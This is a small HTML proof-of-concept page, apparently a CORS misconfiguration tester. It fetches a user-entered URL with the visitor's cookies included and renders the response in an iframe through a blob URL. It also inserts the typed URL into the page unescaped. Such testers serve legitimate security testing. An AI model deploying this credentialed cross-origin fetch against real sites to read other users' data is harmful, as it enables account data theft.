<!DOCTYPE html>
<html>
  <head>
    <title>CORS Page Loader</title>
  </head>
  <body>
    <h1>CORS Exploit Test</h1>
    <script>
      const targetUrl = prompt("Enter the URL you want to test (full URL):");

      if (targetUrl) {
        fetch(targetUrl, {
          credentials: "include"
        })
        .then(response => response.text())
        .then(html => {
          const iframe = document.createElement("iframe");
          iframe.style.width = "100%";
          iframe.style.height = "100vh";
          document.body.innerHTML = `<h2>Loaded: ${targetUrl}</h2>`;
          document.body.appendChild(iframe);

          // Set iframe content using a blob to bypass same-origin issues on srcdoc
          const blob = new Blob([html], { type: "text/html" });
          iframe.src = URL.createObjectURL(blob);
        })
        .catch(error => {
          console.error("Error:", error);
          document.body.innerHTML += `<p style="color:red;">Fetch error: ${error}</p>`;
        });
      } else {
        document.body.innerHTML += `<p style="color:orange;">No URL entered.</p>`;
      }
    </script>
  </body>
</html>
